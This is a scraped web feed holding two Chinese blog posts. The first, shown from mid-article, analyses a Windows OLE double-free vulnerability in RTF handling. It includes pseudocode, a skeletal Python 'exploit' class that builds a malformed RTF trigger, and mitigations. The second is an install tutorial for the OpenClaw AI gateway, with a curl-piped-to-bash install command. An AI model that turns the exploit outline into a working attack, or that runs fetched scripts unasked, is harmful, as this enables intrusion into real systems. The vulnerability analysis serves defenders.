<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ProcessOLEObjectInRTF</span><span class="hljs-params">(<span class="hljs-type">const</span> RTF_DOCUMENT *doc, OLE_OBJECT *obj)</span>
</span>{
    <span class="hljs-comment">// 解析OLE相关流数据</span>
    STREAM *presStream = <span class="hljs-built_in">FindStream</span>(doc, <span class="hljs-string">"\\objupdate"</span>);
    STREAM *contentsStream = <span class="hljs-built_in">FindStream</span>(doc, <span class="hljs-string">"\\objdata"</span>);
    
    <span class="hljs-comment">// 调用漏洞函数</span>
    IStream *pstmContents = <span class="hljs-literal">NULL</span>;
    HRESULT hr = <span class="hljs-built_in">UtOlePresStmToContentsStm</span>(presStream, &amp;pstmContents);
    
    <span class="hljs-comment">// 处理结果</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">SUCCEEDED</span>(hr) &amp;&amp; pstmContents != <span class="hljs-literal">NULL</span>)
    {
        <span class="hljs-comment">// 正常处理内容流</span>
        <span class="hljs-built_in">ProcessContentsStream</span>(pstmContents);
        
        <span class="hljs-comment">// 注意：这里应该有适当的释放</span>
        pstmContents-&gt;<span class="hljs-built_in">Release</span>();
    }
    
    <span class="hljs-comment">// 问题：在某些错误路径下，可能导致pstmContents被多次释放</span>
}
</code></pre>
<h4 data-id="heading-15">内存管理跟踪代码</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 用于跟踪内存操作的辅助函数</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TrackMemoryOperation</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *operation)</span>
</span>{
    <span class="hljs-type">static</span> std::map&lt;<span class="hljs-type">void</span>*, <span class="hljs-type">int</span>&gt; allocation_count;
    
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(operation, <span class="hljs-string">"allocate"</span>) == <span class="hljs-number">0</span>)
    {
        allocation_count[ptr] = <span class="hljs-number">1</span>;
        <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Allocated: %p"</span>, ptr);
    }
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(operation, <span class="hljs-string">"release"</span>) == <span class="hljs-number">0</span>)
    {
        <span class="hljs-keyword">if</span> (allocation_count.<span class="hljs-built_in">find</span>(ptr) != allocation_count.<span class="hljs-built_in">end</span>())
        {
            <span class="hljs-keyword">if</span> (allocation_count[ptr] == <span class="hljs-number">0</span>)
            {
                <span class="hljs-comment">// 检测到双重释放！</span>
                <span class="hljs-built_in">LogError</span>(<span class="hljs-string">"Double free detected: %p"</span>, ptr);
                <span class="hljs-comment">// 触发崩溃或记录漏洞</span>
                <span class="hljs-built_in">TriggerExploitCondition</span>();
            }
            <span class="hljs-keyword">else</span>
            {
                allocation_count[ptr]--;
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-16">漏洞触发条件模拟</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CVE202521298Exploit</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.rtf_template = <span class="hljs-string">"""{\\rtf1\\ansi\\ansicpg1252
\\objupdate
{\\*\\oleobj
\\objemb
{\\*\\objdata
%s
}
}}"""</span>
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_exploit_payload</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""构造触发双重释放的恶意数据"""</span>
        payload = {
            <span class="hljs-string">'pres_stream_data'</span>: self.craft_pres_stream(),
            <span class="hljs-string">'contents_stream_data'</span>: self.craft_contents_stream(),
            <span class="hljs-string">'trigger_sequence'</span>: self.generate_trigger_sequence()
        }
        
        <span class="hljs-comment"># 确保数据格式能触发特定的代码路径</span>
        <span class="hljs-keyword">return</span> self.format_for_rtf(payload)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">craft_pres_stream</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""构造Presentation Stream数据"""</span>
        <span class="hljs-comment"># 设计特定的数据格式和大小</span>
        <span class="hljs-comment"># 以控制内存分配和释放的时机</span>
        stream_data = <span class="hljs-string">b'\x00'</span> * <span class="hljs-number">512</span>  <span class="hljs-comment"># 特定大小</span>
        
        <span class="hljs-comment"># 添加控制信息以影响执行流程</span>
        control_info = struct.pack(<span class="hljs-string">'&lt;I'</span>, <span class="hljs-number">0xDEADBEEF</span>)
        stream_data += control_info
        
        <span class="hljs-keyword">return</span> stream_data
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_trigger_sequence</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""生成触发双重释放的操作序列"""</span>
        <span class="hljs-comment"># 控制RTF解析器执行特定路径</span>
        <span class="hljs-comment"># 使得pstmContents被多次释放</span>
        trigger = []
        
        <span class="hljs-comment"># 第一次操作：正常分配</span>
        trigger.append((<span class="hljs-string">'allocate'</span>, <span class="hljs-string">'pstmContents'</span>))
        
        <span class="hljs-comment"># 触发错误条件</span>
        trigger.append((<span class="hljs-string">'error'</span>, <span class="hljs-string">'stream_parse'</span>))
        
        <span class="hljs-comment"># 错误处理中的释放</span>
        trigger.append((<span class="hljs-string">'release'</span>, <span class="hljs-string">'pstmContents'</span>))
        
        <span class="hljs-comment"># 后续操作中的再次释放</span>
        trigger.append((<span class="hljs-string">'release'</span>, <span class="hljs-string">'pstmContents'</span>))
        
        <span class="hljs-keyword">return</span> trigger
</code></pre>
<h3 data-id="heading-17">📊 影响系统版本</h3>
<h4 data-id="heading-18">受影响操作系统</h4>
<ul>
<li><strong>Windows 10</strong>：版本1507至22H2</li>
<li><strong>Windows 11</strong>：所有版本至24H2</li>
<li><strong>Windows Server</strong>：
<ul>
<li>2008, 2008 R2</li>
<li>2012, 2012 R2</li>
<li>2016, 2019, 2022, 2025</li>
</ul>
</li>
</ul>
<h3 data-id="heading-19">🛡️ 缓解措施</h3>
<h4 data-id="heading-20">1. 官方修复</h4>
<ul>
<li><strong>安装微软2025年1月安全更新</strong>：完全修复此漏洞</li>
<li>通过Windows Update获取最新补丁</li>
</ul>
<h4 data-id="heading-21">2. 临时防护措施</h4>
<ul>
<li>
<p><strong>配置Outlook以纯文本显示邮件</strong>：</p>
<pre><code class="hljs language-powershell" lang="powershell"># 组策略或注册表设置
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Outlook\Options\Mail" -Name "ReadAsPlain" -Value 1
</code></pre>
</li>
<li>
<p><strong>阻断RTF附件</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 邮件网关过滤规则</span>
block file-extension <span class="hljs-string">"rtf"</span>
block mime-type <span class="hljs-string">"application/rtf"</span>
</code></pre>
</li>
<li>
<p><strong>禁用OLE预览功能</strong>：</p>
<pre><code class="hljs language-powershell" lang="powershell"># 通过组策略禁用Office中的OLE对象预览
</code></pre>
</li>
</ul>
<h4 data-id="heading-22">3. 企业级防护策略</h4>
<ul>
<li><strong>网络层面</strong>：在边界设备过滤RTF文件</li>
<li><strong>终端防护</strong>：部署具有内存保护功能的端点安全解决方案</li>
<li><strong>用户教育</strong>：提醒员工不预览可疑邮件</li>
<li><strong>监控检测</strong>：部署针对异常OLE操作的监控规则</li>
</ul>
<h3 data-id="heading-23">📈 技术价值</h3>
<ol>
<li><strong>内存安全研究</strong>：展示了即使成熟如Windows的系统组件，也可能存在基本的内存管理错误</li>
<li><strong>零点击攻击模型</strong>：分析了无需用户交互的攻击向量实现方式</li>
<li><strong>企业安全实践</strong>：提供了从漏洞分析到实际防护的完整解决方案</li>
</ol>
<p>通过深入理解此类高危漏洞的技术细节，安全研究人员和防御者可以更好地预防和应对类似的安全威胁。
6HFtX5dABrKlqXeO5PUv/84SoIo+TE3firf/5vX8AZ640BBEDuMY2EZFwLQ0rzGa</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw (Moltbot) 安装教程: 从 0 搭建本地 AI 助手]]></title>    <link>https://juejin.cn/post/7600752623068102666</link>    <guid>https://juejin.cn/post/7600752623068102666</guid>    <pubDate>2026-01-30T07:34:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600752623068102666" data-draft-id="7600990891206131739" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw (Moltbot) 安装教程: 从 0 搭建本地 AI 助手"/> <meta itemprop="keywords" content="OpenAI,人工智能"/> <meta itemprop="datePublished" content="2026-01-30T07:34:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Bi"/> <meta itemprop="url" content="https://juejin.cn/user/852876756274749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw (Moltbot) 安装教程: 从 0 搭建本地 AI 助手
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/852876756274749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Bi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T07:34:46.000Z" title="Fri Jan 30 2026 07:34:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>Moltbot (原 Clawdbot) 今天改名为:OpenClaw 可以理解为一个本地运行的 AI 网关工具，它负责在大模型与电脑之间搭桥，让 AI 助手真正能在本地工作。它可以部署在你的个人设备上，例如 <strong>Mac、Windows 或 Linux</strong>，让 AI 不只是停留在网页聊天，而是真正接入你的本地环境与常用应用。</p>
<p>它的核心作用是把 AI 模型的能力和你的设备、软件生态连接起来：</p>
<ul>
<li>一端连接大语言模型（官方推荐使用 Claude，同时也支持 Gemini、OpenAI 等）</li>
<li>另一端连接你的本地系统以及常见聊天平台，例如：
<ul>
<li>WhatsApp</li>
<li>Telegram</li>
<li>iMessage</li>
<li>Signal</li>
<li>…</li>
</ul>
</li>
</ul>
<p>通过这种方式，Moltbot 可以让 AI 代理直接在你的日常工具中工作，比如自动回复消息、执行系统任务或触发自动化流程。</p>
<blockquote>
<p>注意：网关模块通常需要稳定访问模型接口和第三方平台。如果选择在服务器上部署，为避免 DNS、Telegram API、模型访问等网络限制问题，建议使用境外服务器环境运行。</p>
</blockquote>
<h2 data-id="heading-1">前置条件</h2>
<ol>
<li>一台 Linux 服务器，2 核 2GB 配置（推荐 Ubuntu）</li>
</ol>
<h2 data-id="heading-2">服务器</h2>
<p>我选择的是 AWS 服务器，新账号有 USD $100 的 AWS 抵用金，有效时间半年，基本可以免费用一段时间。</p>
<p>地区我选择的是新加坡。2 核 2GB 配置可以参考下图的选项配置：</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a879af8be1214255bd24a07ca5690519~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=%2FLeUxGHfesqpl7OvWZJ8mBjfJaU%3D" alt="AWS 服务器配置示例" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    AWS 服务器实例配置示例（2 核 2GB）
  </figcaption>
</figure>
<h2 data-id="heading-3">安装</h2>
<h3 data-id="heading-4">执行终端命令</h3>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://clawd.bot/install.sh | bash
</code></pre>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49db910fe123425184c4c210d21f7182~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=b2psASofoxJ9XplDmZpZRQPuycc%3D" alt="安装脚本风险提示" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
<p>I understand this is powerful and inherently risky. Continue?</p>
<p>选择 <strong>Yes</strong>。</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bc31547aa0f4965bf57f58271225c00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=%2Bxha46wC9vQF%2FjQ8SOhZhlX9jFc%3D" alt="Onboarding 模式选择" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
<p>Onboarding mode</p>
<p>选择 <strong>QuickStart</strong>。</p>
<h3 data-id="heading-5">选择模型和授权</h3>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72829fe54f2e452b94705ebce5603646~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=gTL0xxndjlSuA46nctN2FErrtzQ%3D" alt="模型与授权提供方选择" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    选择模型与授权提供方
  </figcaption>
</figure>
<p>Model/auth provider</p>
<p>这里我选择的是 OpenAI，因为刚好是 ChatGPT Pro 的用户。如果大家没有 OpenAI 的账号，可以选择 Qwen，免费额度足够使用。</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea32095640a849768d0adb1024384077~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=Ji3N1LMWUe5Aq8WXej72UT6JPQA%3D" alt="授权链接展示" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    复制授权链接到浏览器完成授权
  </figcaption>
</figure>
<p>选择完模型后会显示授权链接，把链接复制到你本机浏览器打开完成授权。</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fde595428fab4f6b8abd8d5080f49859~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=v5%2FzrQYGTRwXg%2Fvpk2kuLwrUpN4%3D" alt="授权回调链接提示" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    授权完成后返回的回调链接
  </figcaption>
</figure>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e698f0bcb79422fa097287969d35de8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=Kg6bYIh3O93CRIZunXhqGYMb0H8%3D" alt="浏览器授权完成后的跳转链接" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
<p>如果选择的是 OpenAI 或 Google 等模型，授权后会返回一个 localhost 链接，把链接复制到终端回车即可。Qwen 模型授权后不需要这一步。</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f74a69738dda48a39e8983386074cd3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=AbnJctgrBlrhJ8PUM68iGmeQu2Q%3D" alt="模型选择界面" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
<p>选择模型。</p>
<h3 data-id="heading-6">选择聊天频道</h3>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a46bfda53ce4a52bc6222bae5315561~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=ZAQvImyrQxfkgUJa4nITnYNMXHk%3D" alt="选择聊天频道" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    选择要接入的聊天频道
  </figcaption>
</figure>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21eb37ba04674fb6a62eddf5bba7c4a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=LREdz1d%2BjjqAgksvQXJYjIFS7eQ%3D" alt="Telegram HTTP API Key 提示" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    输入 Telegram HTTP API Key
  </figcaption>
</figure>
<p>这里使用 Telegram，按照提示首先要创建自己的机器人：</p>
<ul>
<li>打开 Telegram，搜索 <code>@BotFather</code>，关注并输入 <code>/newbot</code></li>
<li>给机器人取名字（例如 <code>moltbot</code>）</li>
<li>再给机器人一个 id（例如 <code>molt123_bot</code>）</li>
<li>得到 HTTP API 的 KEY 后输入到终端</li>
<li>别忘了点击刚刚创建的机器人，后续步骤需要接收一条消息</li>
</ul>
<h3 data-id="heading-7">配置 Skill</h3>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35805440e02c4afe95eca230ab7bae86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=TycdnfVxXgGMMTwU%2Fbj2FNIGrLw%3D" alt="配置技能提示" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    是否现在配置 Skills
  </figcaption>
</figure>
<p>Configure skills now?</p>
<p>选 <strong>Yes</strong>。</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/996685daafa74c1fb8b6e36e21cb5e73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=EXCWoHNJoW4jdhH1Xlnlpmj3EzQ%3D" alt="Homebrew 安装命令提示" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Homebrew 安装命令提示
  </figcaption>
</figure>
<p>Show Homebrew install command?</p>
<p>选 <strong>Yes</strong>。</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c5acd7693914d7caa714bb72aa717f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=FD4ajYMLgfZCDysqJBwU4FS0P2k%3D" alt="依赖与 Node 管理器选择" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    选择 Node 管理器并处理依赖安装
  </figcaption>
</figure>
<p>Preferred node manager for skill installs</p>
<p>选 <strong>npm</strong>。</p>
<p>Install missing skill dependencies</p>
<p>跳过也行，后面也可以再回来安装：</p>
<ul>
<li>用空格选择 <strong>Skip for now</strong>，回车即可</li>
</ul>
<p>我这里选择了 <strong>summarize</strong>（bird 忽略）。</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cacdc64f6354420f9ae71599ca256e4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=X%2F%2BQ2PHifaLm67NVutZ53t1ocEs%3D" alt="第三方 API Key 配置" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    第三方 API Key 配置（可暂时跳过）
  </figcaption>
</figure>
<p>这些 KEY 暂时可以跳过，选择 <strong>No</strong>，后面如果需要也可以再填写。</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bdeba196d944fb68fd83b99a6df212d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=pwPdfv3qai0zjJZC836HYKLCuyQ%3D" alt="启用 hooks 提示" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    是否启用 hooks
  </figcaption>
</figure>
<p>Enable hooks</p>
<p>选择 <strong>Skip for now</strong>。</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4c38eb74e174c70842b22eb04feec23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=EWDoWAGtV1wqeIaZImNb2tDXGZ4%3D" alt="选择 hatch 方式" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    选择 hatch 方式（TUI）
  </figcaption>
</figure>
<p>How do you want to hatch your bot?</p>
<p>选择 <strong>Hatch in TUI</strong>。</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4132a0c5ee564b9cbd57a895967cffd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=LUYVcateKpLdi2GPPJ9zn1qe9Ss%3D" alt="安装完成提示" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    安装完成提示
  </figcaption>
</figure>
<p>到这里安装就已经完成了。</p>
<h3 data-id="heading-8">Telegram 机器人配对</h3>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/400e3b26c91845009e5569768faf980d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=Qye79AvCJLpL2rP3Ngs4xA8AJGQ%3D" alt="Telegram 配对码" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Telegram 机器人配对码
  </figcaption>
</figure>
